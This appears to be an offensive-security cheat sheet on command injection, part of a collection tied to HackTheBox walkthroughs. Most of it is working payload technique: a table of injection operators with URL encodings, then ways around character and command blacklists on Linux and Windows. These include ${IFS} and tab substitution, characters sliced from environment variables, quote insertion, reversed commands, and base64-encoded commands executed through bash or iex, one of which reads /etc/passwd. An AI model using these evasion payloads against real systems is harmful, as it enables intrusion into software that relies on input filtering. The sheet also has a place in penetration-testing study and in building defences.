# Command Injection

## Injection Operators

| Operator | Char | URL-Encoded | Behavior |
|---|:---:|:---:|---|
| Semicolon | `;` | `%3b` | Executes both commands, Linux + Windows |
| New line | `\n` | `%0a` | Executes both, Linux + Windows |
| Background | `&` | `%26` | Executes both — second output often shows first |
| Pipe | `\|` | `%7c` | Only the second command's output is shown |
| AND | `&&` | `%26%26` | Second only runs if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second only runs if first fails |
| Sub-shell (backtick) | `` `` `` | `%60%60` | Both — Linux only |
| Sub-shell `$()` | `$()` | `%24%28%29` | Both — Linux only |

> 💡 If semicolons and pipes are filtered, `&&`/`||` chaining is often overlooked — worth testing even when the "obvious" operators are blocked.

---

## Linux — Filtered Character Bypass

```bash
printenv    # view all env vars — useful for finding what's NOT filtered
```

**Space filtering:**
```bash
%09              # tab instead of space (works in many contexts)
${IFS}           # becomes a space+tab — doesn't work inside $() sub-shells
{ls,-la}         # commas become spaces
```

**Other filtered characters:**
```bash
${PATH:0:1}          # → /
${LS_COLORS:10:1}    # → ;
$(tr '!-}' '"-~'<<<[)  # shift a character by one position ([ -> \)
```

## Linux — Blacklisted Command Bypass

**Character insertion** (breaks simple string-match filters — total inserted quotes/backslashes must be even):
```bash
'  "  $@  \
```

**Case manipulation:**
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

**Reversed commands:**
```bash
echo 'whoami' | rev          # generate the reversed string
$(rev<<<'imaohw')            # execute it reversed
```

**Base64-encoded commands:**
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## Windows — Filtered Character Bypass

```powershell
Get-ChildItem Env:    # view all env vars (PowerShell)
```

**Space filtering:**
```
%09                            # tab (CMD)
%PROGRAMFILES:~10,-5%          # → space (CMD)
$env:PROGRAMFILES[10]          # → space (PowerShell)
```

**Other characters:**
```
%HOMEPATH:~0,-17%      # → \  (CMD)
$env:HOMEPATH[0]       # → \  (PowerShell)
```

## Windows — Blacklisted Command Bypass

**Character insertion:**
```
'  "  (total must be even)
^      (CMD only)
```

**Case manipulation** — just send mixed case, e.g. `WhoAmi` — many naive filters are case-sensitive.

**Reversed commands (PowerShell):**
```powershell
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

**Base64-encoded commands (PowerShell):**
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Applied example — arithmetic-array command injection: [Browsed](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/browsed.md)*

</div>
